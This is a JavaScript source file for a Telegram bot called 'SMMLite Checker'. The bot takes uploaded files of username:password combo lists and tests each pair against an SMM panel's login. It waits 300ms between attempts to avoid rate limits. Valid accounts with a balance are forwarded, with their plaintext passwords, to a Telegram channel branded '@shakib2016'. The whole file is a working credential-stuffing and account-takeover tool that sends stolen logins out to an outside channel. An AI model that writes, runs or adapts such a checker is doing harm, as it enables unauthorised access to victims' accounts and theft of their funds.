// api/telegram.js – SMMLite (serial processing with 300ms delay, like 10MS)
import { checkAccount } from '../lib/checkCore.js';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const body = req.body;
  if (!body.message) return res.status(200).json({ ok: true });

  const chatId = body.message.chat.id;
  const text = body.message.text;
  const document = body.message.document;

  if (text === '/start') {
    await sendMessage(chatId, "🤖 SMMLite Checker Bot\nSend a .txt file with combos (user:pass each line).\nI'll check one by one with a small delay and forward HITs (balance ≥ $0.003) to the channel.");
    return res.status(200).json({ ok: true });
  }

  if (document && document.mime_type === 'text/plain') {
    const fileId = document.file_id;
    const fileUrl = await getFileUrl(fileId);
    if (!fileUrl) {
      await sendMessage(chatId, "❌ Failed to get file.");
      return res.status(200).json({ ok: false });
    }

    const fileContent = await downloadFile(fileUrl);
    if (!fileContent) {
      await sendMessage(chatId, "❌ Failed to download file.");
      return res.status(200).json({ ok: false });
    }

    const lines = fileContent.split(/\r?\n/);
    const combos = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      const idx = trimmed.indexOf(':');
      if (idx === -1) continue;
      const user = trimmed.slice(0, idx).trim();
      const pass = trimmed.slice(idx+1).trim();
      if (user && pass) combos.push({ username: user, password: pass });
    }

    if (combos.length === 0) {
      await sendMessage(chatId, "❌ No valid combos found in file (format: user:pass)");
      return res.status(200).json({ ok: false });
    }

    await sendMessage(chatId, `📥 Received ${combos.length} combos. Checking one by one...`);

    let hits = [];
    let total = combos.length;
    let current = 0;

    for (const combo of combos) {
      current++;
      const result = await checkAccount(combo.username, combo.password);
      if (result.hit) {
        hits.push({ ...combo, result });
        await forwardToChannel(combo.username, combo.password, result);
      }
      // প্রতি ৫টি বা শেষে প্রগ্রেস আপডেট
      if (current % 5 === 0 || current === total) {
        await sendMessage(chatId, `⏳ Progress: ${current}/${total} | Hits so far: ${hits.length}`);
      }
      // ৩০০ms ডিলে (10 Minute School-এর মতো)
      await new Promise(r => setTimeout(r, 300));
    }

    let summary = `✅ Checking complete!\nTotal: ${total}\n💰 HITS: ${hits.length}\n`;
    if (hits.length > 0) {
      summary += `\n📋 HIT combos:\n`;
      hits.forEach(h => {
        summary += `${h.username}:${h.password} | $${parseFloat(h.result.balance).toFixed(6)}\n`;
      });
    }
    await sendMessage(chatId, summary);
    return res.status(200).json({ ok: true });
  }

  return res.status(200).json({ ok: true });
}

// ---------- হেল্পার ফাংশন (আগের মতো) ----------
async function sendMessage(chatId, text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });
  } catch(e) {}
}

async function getFileUrl(fileId) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`;
  const res = await fetch(url);
  const data = await res.json();
  if (data.ok && data.result.file_path) {
    return `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
  }
  return null;
}

async function downloadFile(fileUrl) {
  const res = await fetch(fileUrl);
  return await res.text();
}

async function forwardToChannel(username, password, result) {
  if (!TELEGRAM_CHAT_ID) return;
  const message = `🎯 *HIT on SMMLite By @shakib2016*\n\n` +
                  `👤 *Username:* ${username}\n` +
                  `🔑 *Password:* \`${password}\`\n` +
                  `💰 *Balance:* $${parseFloat(result.balance).toFixed(6)}\n\n` +
                  `#SMMLite @shakib2016 #HIT`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  } catch(e) {}
}
